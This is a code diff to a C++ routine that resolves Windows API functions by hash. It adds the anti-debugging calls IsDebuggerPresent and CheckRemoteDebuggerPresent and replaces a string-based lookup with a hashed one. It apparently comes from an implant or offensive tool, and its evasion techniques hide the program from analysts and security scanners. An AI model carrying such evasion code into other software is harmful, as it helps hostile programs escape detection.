@@ -60,7 +60,7 @@ namespace Procs
     ) {
         PPROCS pProcs = new PROCS;
     
-        // NT APIs
+        // NTAPI
         PVOID pNtAdjustPrivilegesToken          = GetProcAddressByHash(hNTDLL, APIHASH_NTADJUSTPRIVILEGESTOKEN);
         pProcs->lpNtAdjustPrivilegesToken       = reinterpret_cast<LPPROC_NTADJUSTPRIVILEGESTOKEN>(pNtAdjustPrivilegesToken);
         PVOID pNtAllocateVirtualMemory          = GetProcAddressByHash(hNTDLL, APIHASH_NTALLOCATEVIRTUALMEMORY);
@@ -148,9 +148,13 @@ namespace Procs
         PVOID pRtlZeroMemory                    = GetProcAddressByHash(hNTDLL, APIHASH_RTLZEROMEMORY);
         pProcs->lpRtlZeroMemory                 = reinterpret_cast<LPPROC_RTLZEROMEMORY>(pRtlZeroMemory);
 
-        // WINAPIs
+        // WINAPI
+        PVOID pCheckRemoteDebuggerPresent       = GetProcAddressByHash(hKernel32DLL, APIHASH_CHECKREMOTEDEBUGGERPRESENT);
+        pProcs->lpCheckRemoteDebuggerPresent    = reinterpret_cast<LPPROC_CHECKREMOTEDEBUGGERPRESENT>(pCheckRemoteDebuggerPresent);
+        PVOID pIsDebuggerPresent                = GetProcAddressByHash(hKernel32DLL, APIHASH_ISDEBUGGERPRESENT);
+        pProcs->lpIsDebuggerPresent             = reinterpret_cast<LPPROC_ISDEBUGGERPRESENT>(pIsDebuggerPresent);
         PVOID pQueryFullProcessImageNameW       = GetProcAddressByHash(hKernel32DLL, APIHASH_QUERYFULLPROCESSIMAGENAMEW);
-        pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(GetProcAddress(hKernel32DLL, "QueryFullProcessImageNameW"));
+        pProcs->lpQueryFullProcessImageNameW    = reinterpret_cast<LPPROC_QUERYFULLPROCESSIMAGENAMEW>(pQueryFullProcessImageNameW);
         PVOID pSetFileInformationByHandle       = GetProcAddressByHash(hKernel32DLL, APIHASH_SETFILEINFORMATIONBYHANDLE);
         pProcs->lpSetFileInformationByHandle    = reinterpret_cast<LPPROC_SETFILEINFORMATIONBYHANDLE>(pSetFileInformationByHandle);
         PVOID pWinHttpCloseHandle               = GetProcAddressByHash(hWinHTTPDLL, APIHASH_WINHTTPCLOSEHANDLE);
